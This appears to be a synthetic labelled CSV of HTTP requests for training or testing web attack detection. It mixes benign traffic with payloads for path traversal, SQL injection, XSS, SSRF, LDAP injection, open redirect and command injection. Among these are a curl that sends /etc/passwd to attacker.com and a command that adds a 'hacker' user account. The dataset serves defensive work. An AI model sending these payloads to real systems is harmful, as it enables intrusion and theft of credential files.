timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T13:18:48.237788,172.16.0.211,172.16.0.130,GET,secure.example.com,/load,doc=..0x2f..0x2f..0x2fetc/passwd,http://secure.example.com/load?doc=..0x2f..0x2f..0x2fetc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:19:00.651226,192.168.1.203,172.16.0.195,GET,example.com,/events,,http://example.com/events,python-requests/2.31.0,benign,0
2026-04-07T13:18:38.491011,172.16.0.155,192.168.1.136,GET,admin.example.com,/fetch,target=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,http://admin.example.com/fetch?target=http%3A%2F%2F%5B%3A%3A1%5D%2Fadmin,burpsuite,ssrf,1
2026-04-07T13:19:02.815539,172.16.0.68,192.168.1.37,GET,api.example.com,/register,,https://api.example.com/register,curl/8.4.0,benign,0
2026-04-07T13:19:07.551177,172.16.0.235,192.168.1.243,GET,192.168.1.100,/privacy,sort=asc&format=json,http://192.168.1.100/privacy?sort=asc&format=json,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:18:54.873863,172.16.0.39,10.0.0.144,GET,secure.example.com,/search,query=<svg/onload=alert('XSS')>,https://secure.example.com/search?query=<svg/onload=alert('XSS')>,sqlmap/1.7.12#dev,xss,1
2026-04-07T13:19:19.284293,172.16.0.134,172.16.0.248,POST,test-app.local,/api/v1/status,view=list&q=laptop,http://test-app.local/api/v1/status?view=list&q=laptop,python-requests/2.31.0,benign,0
2026-04-07T13:19:15.948097,192.168.1.207,192.168.1.175,GET,10.0.0.50,/products,id=%27%20OR%20%27a%27%3D%27a,http://10.0.0.50/products?id=%27%20OR%20%27a%27%3D%27a,nuclei,sql_injection,1
2026-04-07T13:19:07.243702,192.168.1.136,192.168.1.87,GET,admin.example.com,/api/user,user=admin%29%28%26%29,https://admin.example.com/api/user?user=admin%29%28%26%29,ZAP/2.14.0,ldap_injection,1
2026-04-07T13:18:42.084110,172.16.0.101,172.16.0.141,POST,secure.example.com,/products,,https://secure.example.com/products,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:18:51.613779,172.16.0.26,192.168.1.149,POST,10.0.0.50,/search,order=-1%27%20UNION%20SELECT%201%2C2%2C3--,https://10.0.0.50/search?order=-1%27%20UNION%20SELECT%201%2C2%2C3--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",sql_injection,1
2026-04-07T13:18:36.274187,10.0.0.82,192.168.1.221,GET,webapp.internal,/download/../../../etc/passwd,,http://webapp.internal/download/../../../etc/passwd,masscan/1.3,path_traversal,1
2026-04-07T13:18:35.788562,192.168.1.24,192.168.1.148,GET,test-app.local,/download/..%252f..%252f..%252fetc/passwd,,http://test-app.local/download/..%252f..%252f..%252fetc/passwd,burpsuite,path_traversal,1
2026-04-07T13:18:51.251252,192.168.1.9,10.0.0.70,HEAD,test-app.local,/api/orders,,https://test-app.local/api/orders,python-requests/2.31.0,benign,0
2026-04-07T13:18:36.845920,172.16.0.96,192.168.1.206,GET,example.com,/faq,limit=10,http://example.com/faq?limit=10,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:19:21.088433,172.16.0.166,172.16.0.32,HEAD,example.com,/blog/category/tech,from=2024-01-01&order=name,https://example.com/blog/category/tech?from=2024-01-01&order=name,curl/8.4.0,benign,0
2026-04-07T13:18:36.768077,10.0.0.189,10.0.0.80,GET,api.example.com,/events,q=laptop&format=json&id=123,https://api.example.com/events?q=laptop&format=json&id=123,python-requests/2.31.0,benign,0
2026-04-07T13:18:40.600657,172.16.0.118,172.16.0.233,GET,test-app.local,/include,template=..%c0%af..%c0%af..%c0%afetc/passwd,https://test-app.local/include?template=..%c0%af..%c0%af..%c0%afetc/passwd,Nmap Scripting Engine,path_traversal,1
2026-04-07T13:19:40.447813,192.168.1.188,172.16.0.98,HEAD,10.0.0.50,/api/v1/health,to=2024-12-31&id=123,https://10.0.0.50/api/v1/health?to=2024-12-31&id=123,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:18:53.853737,192.168.1.183,192.168.1.251,GET,secure.example.com,/link,return=%2F%2Fevil.com%2F%252f..,https://secure.example.com/link?return=%2F%2Fevil.com%2F%252f..,ZAP/2.14.0,open_redirect,1
2026-04-07T13:18:37.313763,192.168.1.168,172.16.0.223,GET,webapp.internal,/events,order=name&id=123&user=john,http://webapp.internal/events?order=name&id=123&user=john,curl/8.4.0,benign,0
2026-04-07T13:19:42.301006,192.168.1.123,172.16.0.243,GET,shop.example.com,/profile,,https://shop.example.com/profile,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:19:10.063893,192.168.1.49,172.16.0.26,POST,10.0.0.50,/register,,http://10.0.0.50/register,python-requests/2.31.0,benign,0
2026-04-07T13:19:37.339802,192.168.1.161,10.0.0.175,GET,shop.example.com,/register,brand=apple&q=laptop,https://shop.example.com/register?brand=apple&q=laptop,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:19:38.422968,10.0.0.136,10.0.0.80,POST,shop.example.com,/faq,,http://shop.example.com/faq,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:19:36.172636,172.16.0.150,10.0.0.75,POST,webapp.internal,/api/message,message=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,http://webapp.internal/api/message?message=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,wfuzz/3.1.0,xss,1
2026-04-07T13:18:53.320529,10.0.0.142,10.0.0.73,GET,api.example.com,/blog/post/1,from=2024-01-01&to=2024-12-31&status=active,http://api.example.com/blog/post/1?from=2024-01-01&to=2024-12-31&status=active,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:19:28.638552,10.0.0.98,10.0.0.89,POST,shop.example.com,/lookup,exec=test| rev /etc/passwd,http://shop.example.com/lookup?exec=test| rev /etc/passwd,gobuster/3.6,command_injection,1
2026-04-07T13:19:12.295807,10.0.0.95,10.0.0.56,GET,shop.example.com,/include,file=..%c0%af..%c0%af..%c0%afetc/passwd,https://shop.example.com/include?file=..%c0%af..%c0%af..%c0%afetc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:18:47.666644,192.168.1.40,172.16.0.102,GET,10.0.0.50,/privacy,limit=10&view=list&q=laptop,https://10.0.0.50/privacy?limit=10&view=list&q=laptop,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:18:44.059976,10.0.0.106,172.16.0.193,POST,192.168.1.100,/dashboard,order=name,http://192.168.1.100/dashboard?order=name,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:40.405997,10.0.0.126,192.168.1.67,GET,10.0.0.50,/search,cn=admin%29%28%26%29,https://10.0.0.50/search?cn=admin%29%28%26%29,burpsuite,ldap_injection,1
2026-04-07T13:18:32.632580,10.0.0.40,10.0.0.62,HEAD,webapp.internal,/privacy,,http://webapp.internal/privacy,python-requests/2.31.0,benign,0
2026-04-07T13:19:27.571841,172.16.0.203,10.0.0.109,GET,api.example.com,/faq,,http://api.example.com/faq,curl/8.4.0,benign,0
2026-04-07T13:20:05.572500,10.0.0.17,10.0.0.136,GET,example.com,/read,doc=php://filter/convert.base64-encode/resource=index.php,http://example.com/read?doc=php://filter/convert.base64-encode/resource=index.php,masscan/1.3,path_traversal,1
2026-04-07T13:18:47.728246,192.168.1.168,192.168.1.218,POST,10.0.0.50,/api/products,brand=apple,http://10.0.0.50/api/products?brand=apple,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:19:36.174509,172.16.0.200,10.0.0.15,POST,api.example.com,/products,user=' OR 'x'='x,http://api.example.com/products?user=' OR 'x'='x,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),sql_injection,1
2026-04-07T13:18:54.583554,192.168.1.70,172.16.0.76,GET,test-app.local,/notifications,lang=en&page=1,http://test-app.local/notifications?lang=en&page=1,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:20:06.515948,172.16.0.87,172.16.0.160,GET,example.com,/index.html,,https://example.com/index.html,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:19:49.442741,172.16.0.114,10.0.0.212,GET,api.example.com,/load,target=http%3A%2F%2Flocaltest.me%2F,https://api.example.com/load?target=http%3A%2F%2Flocaltest.me%2F,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",ssrf,1
2026-04-07T13:18:40.288748,192.168.1.62,172.16.0.183,GET,webapp.internal,/lookup,ip=test& net user hacker hacker123 /add,https://webapp.internal/lookup?ip=test& net user hacker hacker123 /add,python-requests/2.31.0,command_injection,1
2026-04-07T13:20:14.255279,192.168.1.96,192.168.1.126,HEAD,api.example.com,/news,,http://api.example.com/news,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:18:34.752130,172.16.0.154,192.168.1.202,GET,10.0.0.50,/api/products,limit=10&sort=asc&from=2024-01-01,http://10.0.0.50/api/products?limit=10&sort=asc&from=2024-01-01,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:50.518112,10.0.0.63,10.0.0.84,GET,secure.example.com,/help,,http://secure.example.com/help,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:19:04.782601,172.16.0.186,192.168.1.75,POST,secure.example.com,/tools,run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,https://secure.example.com/tools?run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,sqlmap/1.7.12#dev,command_injection,1
2026-04-07T13:19:48.172438,172.16.0.187,172.16.0.39,GET,secure.example.com,/search,id=%27%20OR%20%27x%27%3D%27x,https://secure.example.com/search?id=%27%20OR%20%27x%27%3D%27x,nuclei,sql_injection,1
2026-04-07T13:19:49.060826,10.0.0.139,10.0.0.23,POST,10.0.0.50,/ping,ip=test; ls -la,https://10.0.0.50/ping?ip=test; ls -la,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",command_injection,1
2026-04-07T13:19:23.250863,10.0.0.247,172.16.0.177,POST,example.com,/lookup,cmd=test; ls -la,http://example.com/lookup?cmd=test; ls -la,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),command_injection,1
2026-04-07T13:20:37.394879,172.16.0.25,192.168.1.185,GET,test-app.local,/api/message,name=<input onfocus=alert(1) autofocus>,http://test-app.local/api/message?name=<input onfocus=alert(1) autofocus>,masscan/1.3,xss,1
2026-04-07T13:20:07.566735,192.168.1.85,192.168.1.208,GET,shop.example.com,/tools,exec=test$(cat /etc/passwd),http://shop.example.com/tools?exec=test$(cat /etc/passwd),"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",command_injection,1
2026-04-07T13:18:35.028875,10.0.0.196,172.16.0.62,POST,webapp.internal,/api/execute,target=test$(sleep 10),http://webapp.internal/api/execute?target=test$(sleep 10),python-requests/2.31.0,command_injection,1
2026-04-07T13:19:46.805197,10.0.0.168,10.0.0.193,GET,example.com,/url,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,https://example.com/url?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,gobuster/3.6,open_redirect,1
2026-04-07T13:20:06.834500,172.16.0.69,192.168.1.48,GET,admin.example.com,/include,page=C:\Windows\System32\drivers\etc\hosts,http://admin.example.com/include?page=C:\Windows\System32\drivers\etc\hosts,masscan/1.3,path_traversal,1
2026-04-07T13:18:47.137761,10.0.0.127,172.16.0.221,POST,secure.example.com,/comment,query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,https://secure.example.com/comment?query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,wfuzz/3.1.0,xss,1
2026-04-07T13:18:53.647211,192.168.1.81,10.0.0.42,GET,webapp.internal,/news,,http://webapp.internal/news,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:20:03.060841,10.0.0.111,10.0.0.122,GET,secure.example.com,/checkout,q=laptop,http://secure.example.com/checkout?q=laptop,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:20:01.761237,10.0.0.58,192.168.1.136,HEAD,192.168.1.100,/notifications,format=json,http://192.168.1.100/notifications?format=json,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:18:44.588013,10.0.0.221,172.16.0.164,GET,test-app.local,/notifications,,http://test-app.local/notifications,python-requests/2.31.0,benign,0
2026-04-07T13:20:25.051121,10.0.0.202,10.0.0.26,GET,admin.example.com,/redirect,url=https%3A%2F%2Fevil.com,https://admin.example.com/redirect?url=https%3A%2F%2Fevil.com,burpsuite,open_redirect,1
2026-04-07T13:20:30.194892,172.16.0.186,10.0.0.31,GET,test-app.local,/events,status=active&q=laptop&user=john,http://test-app.local/events?status=active&q=laptop&user=john,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:19:28.100341,192.168.1.37,192.168.1.174,GET,192.168.1.100,/fetch,fetch=http%3A%2F%2F0x7f000001%2F,http://192.168.1.100/fetch?fetch=http%3A%2F%2F0x7f000001%2F,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),ssrf,1
2026-04-07T13:19:18.773036,192.168.1.94,192.168.1.182,GET,test-app.local,/api/fetch,fetch=http%3A%2F%2Flocaltest.me%2F,http://test-app.local/api/fetch?fetch=http%3A%2F%2Flocaltest.me%2F,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",ssrf,1
2026-04-07T13:21:00.484004,172.16.0.254,172.16.0.126,GET,example.com,/index.html,page=1&lang=en&sort=asc,http://example.com/index.html?page=1&lang=en&sort=asc,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:22.526951,10.0.0.118,192.168.1.156,GET,shop.example.com,/notifications,,https://shop.example.com/notifications,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:18:34.649375,10.0.0.8,192.168.1.13,POST,secure.example.com,/css/style.css,,https://secure.example.com/css/style.css,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:20:21.169026,192.168.1.214,172.16.0.212,GET,secure.example.com,/return,next=%2F%2Fevil.com%2Fpath,http://secure.example.com/return?next=%2F%2Fevil.com%2Fpath,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",open_redirect,1
2026-04-07T13:19:35.092631,10.0.0.163,10.0.0.44,GET,10.0.0.50,/download/file:///etc/passwd,,http://10.0.0.50/download/file:///etc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:20:17.785661,192.168.1.223,172.16.0.82,GET,secure.example.com,/privacy,,http://secure.example.com/privacy,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:19:55.616333,192.168.1.2,10.0.0.230,GET,example.com,/api/execute,target=test| rev /etc/passwd,http://example.com/api/execute?target=test| rev /etc/passwd,sqlmap/1.7.12#dev,command_injection,1
2026-04-07T13:20:32.403306,192.168.1.192,192.168.1.60,GET,192.168.1.100,/directory,uid=admin%2A,https://192.168.1.100/directory?uid=admin%2A,burpsuite,ldap_injection,1
2026-04-07T13:19:30.168697,172.16.0.91,192.168.1.44,GET,10.0.0.50,/about,,http://10.0.0.50/about,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:18:53.000961,192.168.1.72,172.16.0.85,GET,example.com,/faq,,http://example.com/faq,curl/8.4.0,benign,0
2026-04-07T13:18:43.188491,192.168.1.32,192.168.1.14,GET,10.0.0.50,/api/v2/data,,https://10.0.0.50/api/v2/data,curl/8.4.0,benign,0
2026-04-07T13:19:21.501888,172.16.0.197,172.16.0.49,POST,admin.example.com,/products,,http://admin.example.com/products,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:21:01.759057,172.16.0.225,192.168.1.126,GET,secure.example.com,/return,goto=%2F%2Fgoogle.com%252f%40evil.com,https://secure.example.com/return?goto=%2F%2Fgoogle.com%252f%40evil.com,gobuster/3.6,open_redirect,1
2026-04-07T13:20:51.448659,192.168.1.196,192.168.1.249,POST,10.0.0.50,/faq,filter=recent,http://10.0.0.50/faq?filter=recent,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:20:13.904768,192.168.1.109,10.0.0.9,GET,admin.example.com,/products,type=product&order=name,https://admin.example.com/products?type=product&order=name,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:18:38.094020,172.16.0.252,10.0.0.203,HEAD,secure.example.com,/help,lang=en&user=john&category=electronics,http://secure.example.com/help?lang=en&user=john&category=electronics,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:19:39.108389,172.16.0.58,10.0.0.120,GET,example.com,/return,redirect=http%3A%2F%2Fevil.com,https://example.com/return?redirect=http%3A%2F%2Fevil.com,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",open_redirect,1
2026-04-07T13:21:09.064362,172.16.0.211,10.0.0.76,POST,example.com,/notifications,type=product,https://example.com/notifications?type=product,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:21:39.119481,172.16.0.25,192.168.1.50,GET,example.com,/products,,https://example.com/products,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:20:44.311995,192.168.1.136,192.168.1.46,GET,192.168.1.100,/,,http://192.168.1.100/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
